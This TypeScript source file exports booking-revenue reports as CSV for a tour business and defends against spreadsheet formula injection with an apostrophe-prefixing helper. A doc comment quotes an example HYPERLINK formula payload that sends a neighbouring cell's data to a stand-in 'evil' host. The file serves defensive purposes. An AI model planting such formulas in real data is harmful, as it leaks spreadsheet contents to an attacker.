/**
 * The CSV renderer for the money reports (Week 7 plan, Task 12 — 7D;
 * BUILD_SPEC §9 "Reports: CSV export for each").
 *
 * Separate from `money.ts` on purpose: that module answers "what counts as
 * money", this one answers "what does the file look like". The split is what
 * lets the escaping be tested as escaping — `admin-reports.test.ts` exercises
 * `csvField` directly with a comma, a quote and a newline, not only through a
 * report that happens to contain one (the plan: "escape with a tested helper;
 * never build CSV with string concatenation in the procedure").
 *
 * ## This is the ONE place that divides by 100
 *
 * Every tRPC payload in this project carries integer centavos and the browser
 * formats them (CLAUDE.md § Conventions). A CSV is the exception, because it is
 * not a payload — it is a file a person opens in a spreadsheet, and
 * `150000` in a column headed "Received" would be read as ₱150,000.
 *
 * `pesosFromCentavos` is deliberately NOT `formatPeso` from `@rg/shared`.
 * `formatPeso` is a DISPLAY formatter: it emits a `₱` glyph, groups thousands
 * with commas and rounds to whole pesos. All three are wrong in a cell — the
 * glyph and the separator make the value text rather than a number in Excel
 * and Sheets, the separator then has to be escaped as a comma inside a CSV,
 * and the rounding loses centavos from a figure finance is reconciling. So a
 * cell gets a bare `1500.00`: two decimals, no glyph, no grouping, and
 * negative numbers keep their sign (an overpaid booking is a real row).
 *
 * ## RFC 4180, and nothing cleverer
 *
 * CRLF line endings and a header row, per the RFC; a field is quoted only when
 * it contains a comma, a double quote, CR or LF, and an inner quote is doubled.
 *
 * ## Two escapes, not one: quoting is for the FILE, `csvText` is for the READER
 *
 * RFC quoting keeps a comma from splitting a cell. It does nothing at all about
 * the other hazard, which is that **Excel and Sheets evaluate a cell beginning
 * `=`, `+`, `-` or `@` as a FORMULA** — so a guest who types
 * `=HYPERLINK("http://evil/?l="&A2,"Click")` as their name at checkout has
 * written a live, clickable link into a spreadsheet the owner opens, with the
 * row beside it as its argument. That is CSV formula injection, and `leadName`
 * is guest-entered text that reaches this file untouched otherwise.
 *
 * `csvText()` neutralises it, and it is applied to **text cells only**. That
 * distinction is the whole reason there are two functions rather than one
 * cleverer one: a peso cell legitimately begins with `-` (an overpaid booking),
 * and prefixing that would corrupt a real figure. No column-type sniffing is
 * needed to tell them apart, because every money cell below already goes
 * through `pesosFromCentavos()` individually, beside the text cells rather than
 * mixed in with them.
 */
import type {
  DateRangeInput,
  OutstandingRow,
  ReportName,
  ReportSummary,
  TourRevenueRow,
} from '@rg/shared';

/** CRLF, per RFC 4180 — and what Excel on Windows expects. */
const EOL = '\r\n';

/** The characters that force a field to be quoted. */
const MUST_QUOTE = /[",\r\n]/;

/**
 * One CSV field, quoted only if it has to be.
 *
 * Exported and tested on its own. An escaping function that is only ever
 * exercised through a report is tested by whatever that report's fixtures
 * happen to contain, which is how a quote-in-a-tour-title ships broken.
 */
export function csvField(value: string): string {
  if (!MUST_QUOTE.test(value)) return value;
  return `"${value.replace(/"/g, '""')}"`;
}

/**
 * The leading characters a spreadsheet reads as "this cell is a formula".
 *
 * `=` and `+` start a formula outright, `-` starts a negated one, and `@`
 * starts a legacy Lotus-style function call that Excel still honours. TAB and
 * CR are here too, for the same reason and because they are on the same
 * published list: a leading whitespace character is consumed before the parse,
 * so `\t=cmd` is `=cmd` by the time the cell is evaluated, and a mitigation
 * that handled four of the six would be a half-closed control.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * One TEXT cell, with any formula-leading character neutralised.
 *
 * A single leading apostrophe, which is the standard mitigation: on CSV import
 * a spreadsheet treats the cell as literal text and the formula never runs. The
 * apostrophe stays VISIBLE in the cell, and that is the right trade — a name
 * that reads `'=HYPERLINK(…)` is odd-looking data, while the same name without
 * it is a live link in the owner's spreadsheet. Nothing is truncated or
 * rewritten; one character is prepended, and only to a value that begins with
 * one of six characters.
 *
 * **Never call this on a number.** `pesosFromCentavos()`'s output begins with
 * `-` for an overpaid booking, and prefixing that would turn a real figure into
 * text. The two are kept apart at the call site, cell by cell — see the module
 * doc.
 *
 * Composes with, rather than replaces, `csvField`: this runs first and
 * `toCsv()` then quotes the result if it needs quoting, so a hostile name
 * carrying a comma and a quote as well gets both treatments.
 */
export function csvText(value: string): string {
  return FORMULA_LEAD.test(value) ? `'${value}` : value;
}

/**
 * Integer centavos as a bare peso amount with two decimals: `1500.00`.
 *
 * Integer arithmetic on both halves — no float division touches money
 * (CLAUDE.md). The sign is taken off first so `-1` renders `-0.01` rather than
 * `0.-1`, which is what `%` on a negative number would otherwise produce.
 */
export function pesosFromCentavos(centavos: number): string {
  const sign = centavos < 0 ? '-' : '';
  const absolute = Math.abs(centavos);
  return `${sign}${Math.trunc(absolute / 100)}.${String(absolute % 100).padStart(2, '0')}`;
}

/** A header row and its data rows, escaped field by field. */
export function toCsv(header: readonly string[], rows: readonly (readonly string[])[]): string {
  const line = (fields: readonly string[]) => fields.map(csvField).join(',');
  return [line(header), ...rows.map(line)].join(EOL);
}

/* ------------------------------------------------------------ The three files */

/**
 * The headline figures as label/amount pairs.
 *
 * Two columns rather than one wide row, because a summary is read down the
 * page and because "Bookings" is a COUNT in a file whose other column is
 * pesos — stated as a plain integer, not dressed up with two decimals it has
 * no business having.
 */
export function summaryCsv(summary: ReportSummary): string {
  return toCsv(
    ['Figure', 'Amount (PHP)'],
    [
      ['Money received', pesosFromCentavos(summary.receivedCentavos)],
      ['Refunds', pesosFromCentavos(summary.refundedCentavos)],
      ['Net received', pesosFromCentavos(summary.netReceivedCentavos)],
      ['Still to collect', pesosFromCentavos(summary.stillToCollectCentavos)],
      ['Bookings', String(summary.bookingCount)],
    ],
  );
}

export function byTourCsv(rows: readonly TourRevenueRow[]): string {
  return toCsv(
    [
      'Tour',
      'Bookings',
      'Received (PHP)',
      'Refunds (PHP)',
      'Net received (PHP)',
      'Still to collect (PHP)',
    ],
    rows.map((row) => [
      // The one text cell in this file; the other five are numbers we built.
      csvText(row.tourTitle),
      String(row.bookingCount),
      pesosFromCentavos(row.receivedCentavos),
      pesosFromCentavos(row.refundedCentavos),
      pesosFromCentavos(row.netReceivedCentavos),
      pesosFromCentavos(row.stillToCollectCentavos),
    ]),
  );
}

export function outstandingCsv(rows: readonly OutstandingRow[]): string {
  return toCsv(
    [
      'Booking',
      'Tour date',
      'Tour',
      'Guest',
      'Status',
      'Total (PHP)',
      'Paid (PHP)',
      'Outstanding (PHP)',
    ],
    rows.map((row) => [
      /*
       * The four text cells, each neutralised. `leadName` is the one that
       * matters most — it is typed by a guest at checkout — but a tour title is
       * admin-entered text reaching the same spreadsheet, and `ref` and
       * `status` go through it too rather than being reasoned about: a cell
       * either is text or is a number we formatted, and every text cell is
       * treated the same way so none can be forgotten.
       *
       * `tourDate` and the three peso cells below are NOT: they are values this
       * server generated, and an overpaid booking's `-200.00` must stay a
       * number.
       */
      csvText(row.ref),
      row.tourDate,
      csvText(row.tourTitle),
      csvText(row.leadName),
      csvText(row.status),
      pesosFromCentavos(row.totalCentavos),
      pesosFromCentavos(row.paidCentavos),
      pesosFromCentavos(row.outstandingCentavos),
    ]),
  );
}

/** The filename each report downloads as. Kebab-case, no spaces, no glyphs. */
const FILE_STEM: Record<ReportName, string> = {
  summary: 'summary',
  byTour: 'by-tour',
  outstanding: 'outstanding',
};

/**
 * `travelsugbo-by-tour-2026-03-01-to-2026-03-31.csv`.
 *
 * Built from the report name and the two already-validated civil dates, so
 * every character is from a closed set — there is no path separator, quote or
 * space a caller could get into a `Content-Disposition` header or a filesystem
 * through this value, even though today the browser is the only thing that
 * ever sees it.
 */
export function csvFilename(report: ReportName, range: DateRangeInput): string {
  return `travelsugbo-${FILE_STEM[report]}-${range.from}-to-${range.to}.csv`;
}
